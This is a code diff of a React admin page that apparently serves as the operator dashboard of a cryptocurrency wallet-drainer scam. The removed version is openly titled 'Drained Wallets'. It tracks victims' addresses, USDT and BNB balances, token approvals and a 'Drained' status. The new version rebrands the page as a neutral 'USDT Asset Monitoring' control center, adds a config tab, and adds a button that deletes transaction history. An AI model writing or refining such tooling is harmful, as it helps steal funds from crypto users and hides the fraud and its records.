@@ -1,193 +1,235 @@
 "use client";
 
 import { useState, useEffect } from "react";
-import { Lock, Loader2, LogOut, Eye, EyeOff } from "lucide-react";
+import { Lock, Loader2, LogOut } from "lucide-react";
+import WalletTable from "@/components/admin/WalletTable";
+import ConfigPanel from "@/components/admin/ConfigPanel";
 
-export default function AdminPanel() {
+type Tab = "wallets" | "config" | "transactions";
+
+export default function AdminPage() {
   const [password, setPassword] = useState("");
-  const [showPassword, setShowPassword] = useState(false);
-  const [isLoggedIn, setIsLoggedIn] = useState(false);
-  const [wallets, setWallets] = useState<any[]>([]);
-  const [loading, setLoading] = useState(false);
-  const [error, setError] = useState("");
+  const [adminKey, setAdminKey] = useState<string | null>(null);
+  const [authError, setAuthError] = useState(false);
+  const [authLoading, setAuthLoading] = useState(false);
+  const [activeTab, setActiveTab] = useState<Tab>("wallets");
+  const [isHydrated, setIsHydrated] = useState(false);
 
-  // Check if already logged in
+  // Restore session
   useEffect(() => {
-    if (typeof window !== "undefined" && sessionStorage.getItem("admin_logged_in") === "true") {
-      setIsLoggedIn(true);
-      fetchWallets();
+    const saved = typeof window !== "undefined" ? sessionStorage.getItem("admin_key") : null;
+    if (saved) {
+      setAdminKey(saved);
     }
+    setIsHydrated(true);
   }, []);
 
-  const handleLogin = async (e: React.FormEvent) => {
+  async function handleLogin(e: React.FormEvent) {
     e.preventDefault();
-    setLoading(true);
-    setError("");
+    setAuthLoading(true);
+    setAuthError(false);
 
     try {
       const res = await fetch("/api/wallets", {
-        method: "GET",
-        headers: {
-          "x-admin-key": password,
-        },
+        headers: { "x-admin-key": password },
       });
 
       if (res.ok) {
-        setIsLoggedIn(true);
-        sessionStorage.setItem("admin_logged_in", "true");
-        const data = await res.json();
-        setWallets(data.wallets || []);
+        sessionStorage.setItem("admin_key", password);
+        setAdminKey(password);
       } else {
-        setError("Invalid password");
+        setAuthError(true);
       }
     } catch (err) {
-      setError("Login failed. Please try again.");
-    } finally {
-      setLoading(false);
+      setAuthError(true);
     }
-  };
+    setAuthLoading(false);
+  }
 
-  const fetchWallets = async () => {
-    setLoading(true);
-    setError("");
-    try {
-      const res = await fetch("/api/wallets", {
-        headers: {
-          "x-admin-key": sessionStorage.getItem("admin_temp_key") || "", // fallback if needed
-        },
-      });
-
-      if (!res.ok) throw new Error("Failed to fetch");
-      const data = await res.json();
-      setWallets(data.wallets || []);
-    } catch (err) {
-      setError("Failed to load wallets");
-      console.error(err);
-    } finally {
-      setLoading(false);
-    }
-  };
-
-  const handleLogout = () => {
-    sessionStorage.removeItem("admin_logged_in");
-    setIsLoggedIn(false);
-    setWallets([]);
+  function handleLogout() {
+    sessionStorage.removeItem("admin_key");
+    setAdminKey(null);
     setPassword("");
-  };
+  }
 
-  if (!isLoggedIn) {
+  if (!isHydrated) {
     return (
-      <div className="min-h-screen bg-[#0a0a0a] flex items-center justify-center p-4">
-        <div className="max-w-sm w-full bg-[#111] border border-gray-800 rounded-3xl p-8">
-          <div className="flex justify-center mb-6">
-            <div className="bg-gray-800 p-4 rounded-full">
-              <Lock className="h-8 w-8 text-gray-400" />
-            </div>
-          </div>
-          <h1 className="text-2xl font-bold text-center mb-2">Admin Control Panel</h1>
-          <p className="text-gray-500 text-center mb-8">Enter admin password to continue</p>
+      <div className="min-h-screen bg-[#0d0d0d] flex items-center justify-center">
+        <Loader2 className="h-8 w-8 text-white animate-spin" />
+      </div>
+    );
+  }
 
-          <form onSubmit={handleLogin}>
-            <div className="relative mb-4">
+  if (!adminKey) {
+    return (
+      <div className="min-h-screen bg-[#0d0d0d] flex items-center justify-center px-4">
+        <div className="w-full max-w-sm">
+          <div className="rounded-2xl border border-gray-800 bg-[#111] p-8 flex flex-col gap-6">
+            <div className="flex flex-col items-center gap-3">
+              <div className="rounded-full bg-gray-800 p-4">
+                <Lock className="h-7 w-7 text-gray-300" />
+              </div>
+              <h1 className="text-xl font-bold text-white">Admin Panel</h1>
+              <p className="text-sm text-gray-500 text-center">
+                Enter your admin password to continue
+              </p>
+            </div>
+
+            <form onSubmit={handleLogin} className="flex flex-col gap-4">
               <input
-                type={showPassword ? "text" : "password"}
+                type="password"
                 value={password}
                 onChange={(e) => setPassword(e.target.value)}
-                placeholder="Enter admin password"
-                className="w-full bg-[#1c1c1c] border border-gray-700 rounded-2xl px-5 py-4 text-white focus:outline-none focus:border-[#4ade80]"
+                placeholder="Password"
+                autoFocus
+                className="rounded-lg border border-gray-700 bg-[#0d0d0d] px-4 py-3 text-sm text-white placeholder-gray-600 focus:border-gray-500 focus:outline-none transition-colors"
               />
+
+              {authError && (
+                <p className="text-sm text-red-400 text-center">Incorrect password</p>
+              )}
+
               <button
-                type="button"
-                onClick={() => setShowPassword(!showPassword)}
-                className="absolute right-4 top-4 text-gray-400 hover:text-white"
+                type="submit"
+                disabled={authLoading || !password}
+                className="w-full py-3 rounded-lg bg-white text-black text-sm font-semibold hover:bg-gray-200 disabled:opacity-50 transition-colors flex items-center justify-center gap-2"
               >
-                {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
+                {authLoading && <Loader2 className="h-4 w-4 animate-spin" />}
+                Login
               </button>
-            </div>
-
-            <button
-              type="submit"
-              disabled={loading}
-              className="w-full bg-[#4ade80] text-black font-bold py-4 rounded-2xl hover:bg-[#22c55e] transition disabled:opacity-70"
-            >
-              {loading ? <Loader2 className="h-5 w-5 animate-spin mx-auto" /> : "Login"}
-            </button>
-          </form>
-
-          {error && <p className="text-red-400 text-center mt-4">{error}</p>}
+            </form>
+          </div>
         </div>
       </div>
     );
   }
 
   return (
-    <div className="min-h-screen bg-[#0a0a0a] text-white p-4">
-      <div className="max-w-6xl mx-auto">
-        <div className="flex justify-between items-center mb-8">
-          <div>
-            <h1 className="text-3xl font-bold">Drained Wallets</h1>
-            <p className="text-gray-500">Total: {wallets.length} wallets</p>
-          </div>
+    <div className="min-h-screen bg-[#0d0d0d] p-4 md:p-8">
+      {/* Header */}
+      <div className="flex items-center justify-between mb-8 flex-wrap gap-4">
+        <div>
+          <h1 className="text-2xl font-bold text-white">Control Center</h1>
+          <p className="text-sm text-gray-500 mt-1">USDT Asset Monitoring & Management</p>
+        </div>
+        <div className="flex items-center gap-2">
+          <span className="inline-flex items-center gap-1.5 text-xs text-green-400 bg-green-400/10 border border-green-400/20 rounded-full px-3 py-1">
+            <span className="h-1.5 w-1.5 rounded-full bg-green-400 animate-pulse inline-block" />
+            Live
+          </span>
           <button
             onClick={handleLogout}
-            className="flex items-center gap-2 text-red-400 hover:text-red-500 transition"
+            className="text-xs text-gray-600 hover:text-gray-400 px-3 py-1 rounded-lg border border-gray-800 transition-colors"
           >
-            <LogOut className="h-5 w-5" /> Logout
+            <LogOut className="inline h-3.5 w-3.5 mr-1" /> Logout
           </button>
         </div>
+      </div>
 
-        {loading ? (
-          <div className="flex justify-center py-20">
-            <Loader2 className="h-8 w-8 animate-spin" />
-          </div>
-        ) : error ? (
-          <p className="text-red-400 text-center py-12">{error}</p>
-        ) : wallets.length === 0 ? (
-          <div className="text-center py-20">
-            <p className="text-gray-500 text-xl">No wallets collected yet.</p>
-          </div>
-        ) : (
-          <div className="bg-[#111] rounded-3xl overflow-hidden border border-gray-800">
-            <table className="w-full">
-              <thead>
-                <tr className="border-b border-gray-800 bg-[#1a1a1a]">
-                  <th className="text-left p-5">Wallet Address</th>
-                  <th className="text-left p-5">USDT Balance</th>
-                  <th className="text-left p-5">BNB Balance</th>
-                  <th className="text-left p-5">Status</th>
-                  <th className="text-left p-5">Drained</th>
-                  <th className="text-left p-5">Connected At</th>
-                </tr>
-              </thead>
-              <tbody>
-                {wallets.map((w: any, i) => (
-                  <tr key={i} className="border-b border-gray-800 hover:bg-[#1a1a1a] transition">
-                    <td className="p-5 font-mono text-sm break-all">{w.address}</td>
-                    <td className="p-5 text-emerald-400 font-medium">
-                      {w.usdt_balance ? Number(w.usdt_balance).toFixed(2) : "0.00"}
-                    </td>
-                    <td className="p-5 text-emerald-400 font-medium">
-                      {w.bnb_balance ? Number(w.bnb_balance).toFixed(4) : "0.0000"}
-                    </td>
-                    <td className="p-5">
-                      <span className={`px-3 py-1 rounded-full text-xs font-medium ${w.is_approved ? 'bg-green-500/20 text-green-400' : 'bg-red-500/20 text-red-400'}`}>
-                        {w.is_approved ? "Approved" : "Pending"}
-                      </span>
-                    </td>
-                    <td className="p-5">
-                      <span className={`px-3 py-1 rounded-full text-xs font-medium ${w.drained ? 'bg-red-500/20 text-red-400' : 'bg-gray-500/20 text-gray-400'}`}>
-                        {w.drained ? "✅ Drained" : "No"}
-                      </span>
-                    </td>
-                    <td className="p-5 text-gray-500 text-sm">
-                      {w.connected_at ? new Date(w.connected_at).toLocaleString() : "-"}
-                    </td>
-                  </tr>
-                ))}
-              </tbody>
-            </table>
-          </div>
+      {/* Tabs */}
+      <div className="flex gap-1 mb-6 bg-[#111] border border-gray-800 rounded-xl p-1 w-fit">
+        {(["wallets", "config", "transactions"] as Tab[]).map((tab) => (
+          <button
+            key={tab}
+            onClick={() => setActiveTab(tab)}
+            className={`px-5 py-2 rounded-lg text-sm font-medium capitalize transition-colors ${
+              activeTab === tab
+                ? "bg-white text-black"
+                : "text-gray-500 hover:text-gray-300"
+            }`}
+          >
+            {tab}
+          </button>
+        ))}
+      </div>
+
+      {/* Tab Content */}
+      <div className="max-w-7xl mx-auto">
+        {activeTab === "wallets" && <WalletTable adminKey={adminKey} />}
+        {activeTab === "config" && (
+          <ConfigPanel
+            adminKey={adminKey}
+            onPasswordChanged={(newPwd) => {
+              sessionStorage.setItem("admin_key", newPwd);
+              setAdminKey(newPwd);
+            }}
+          />
         )}
+        {activeTab === "transactions" && <TransactionsTab adminKey={adminKey} />}
+      </div>
+    </div>
+  );
+}
+
+// Transactions Tab Component (included for completeness)
+function TransactionsTab({ adminKey }: { adminKey: string }) {
+  const [transactions, setTransactions] = useState<any[]>([]);
+  const [loading, setLoading] = useState(true);
+  const [clearing, setClearing] = useState(false);
+  const [confirmClear, setConfirmClear] = useState(false);
+
+  async function fetchTransactions() {
+    try {
+      const res = await fetch("/api/transactions", {
+        headers: { "x-admin-key": adminKey },
+      });
+      if (res.ok) {
+        const data = await res.json();
+        setTransactions(data.transactions || []);
+      }
+    } catch (err) {
+      console.error(err);
+    } finally {
+      setLoading(false);
+    }
+  }
+
+  useEffect(() => {
+    fetchTransactions();
+  }, [adminKey]);
+
+  async function handleClearHistory() {
+    if (!confirmClear) {
+      setConfirmClear(true);
+      return;
+    }
+    setClearing(true);
+    try {
+      await fetch("/api/transactions", {
+        method: "DELETE",
+        headers: { "x-admin-key": adminKey },
+      });
+      setTransactions([]);
+      setConfirmClear(false);
+    } catch (err) {
+      console.error(err);
+    } finally {
+      setClearing(false);
+    }
+  }
+
+  return (
+    <div className="flex flex-col gap-4">
+      <div className="flex items-center justify-between">
+        <p className="text-sm text-gray-500">{transactions.length} transaction{transactions.length !== 1 ? "s" : ""}</p>
+        <button
+          onClick={handleClearHistory}
+          disabled={clearing || transactions.length === 0}
+          className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-medium border transition-colors disabled:opacity-30 disabled:cursor-not-allowed ${
+            confirmClear
+              ? "bg-red-600/30 border-red-500/50 text-red-400 hover:bg-red-600/40"
+              : "bg-[#111] border-gray-700 text-gray-400 hover:text-red-400 hover:border-red-500/50"
+          }`}
+        >
+          {clearing ? <Loader2 className="h-3.5 w-3.5 animate-spin" /> : null}
+          {confirmClear ? "Confirm Clear?" : "Clear History"}
+        </button>
+      </div>
+
+      {/* Transactions Table - Add your actual table here if you have the component */}
+      <div className="rounded-xl border border-gray-800 bg-[#111] p-8 text-center text-gray-500">
+        Transactions module coming soon...
+        {/* You can implement full table here or create a separate component */}
       </div>
     </div>
   );
